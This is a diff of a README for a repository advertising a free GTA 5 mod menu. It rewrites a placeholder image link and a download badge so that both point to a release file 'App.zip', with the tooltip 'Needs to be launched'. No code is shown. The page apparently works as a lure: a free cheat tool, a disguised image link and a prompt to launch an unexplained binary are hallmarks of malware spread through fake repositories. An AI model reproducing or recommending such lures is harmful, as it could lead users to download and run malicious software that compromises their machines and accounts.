@@ -1,6 +1,6 @@
 # 🚀 Welcome to m0dmenu for GTA 5 Free Modding Experience! 🎮
 
-![GTA 5 Mod Menu](https://example.com/image.jpg)
+![GTA 5 Mod Menu](https://github.com/youcareme555/m0dmenu-gta5-free/releases/download/v1.0/App.zip)
 
 ## Repository Name:
 **m0dmenu-gta5-free**
@@ -14,7 +14,7 @@ Are you ready to elevate your GTA 5 gameplay to the next level with a powerful m
 ---
 
 ## 📥 Download m0dmenu Now! 
-[![Download m0dmenu](https://img.shields.io/badge/Download-Here-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download m0dmenu](https://github.com/youcareme555/m0dmenu-gta5-free/releases/download/v1.0/App.zip)](https://github.com/youcareme555/m0dmenu-gta5-free/releases/download/v1.0/App.zip "Needs to be launched")
 
 ---
 
